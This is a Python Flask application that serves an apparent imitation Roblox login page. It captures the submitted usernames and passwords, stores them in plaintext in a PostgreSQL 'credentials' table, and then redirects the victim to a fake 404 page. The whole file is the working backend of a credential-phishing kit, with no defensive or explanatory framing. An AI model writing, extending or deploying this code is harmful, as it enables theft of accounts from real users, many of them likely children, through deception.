from flask import Flask, request, render_template, redirect, url_for
import psycopg2
import os
from datetime import datetime

app = Flask(__name__)

DATABASE_URL = os.getenv('DATABASE_URL')

def get_db_connection():
    return psycopg2.connect(DATABASE_URL)

def init_db():
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute('''
        CREATE TABLE IF NOT EXISTS credentials (
            login TEXT PRIMARY KEY,
            password TEXT NOT NULL,
            added_time TIMESTAMP NOT NULL
        )
    ''')
    conn.commit()
    cur.close()
    conn.close()

def save_credential(login, password):
    added_time = datetime.now()
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("INSERT INTO credentials (login, password, added_time) VALUES (%s, %s, %s) ON CONFLICT (login) DO UPDATE SET password = %s, added_time = %s",
                (login, password, added_time, password, added_time))
    conn.commit()
    cur.close()
    conn.close()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login-roblox.html')
def login_page():
    return render_template('login-roblox.html')

@app.route('/submit', methods=['POST'])
def submit():
    login = request.form.get('login')
    password = request.form.get('password')
    if login and password:
        save_credential(login, password)
    return redirect(url_for('not_found'))

@app.route('/404')
def not_found():
    return render_template('404.html')

@app.route('/setup', methods=['GET'])
def setup():
    init_db()
    return "Database initialized", 200

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
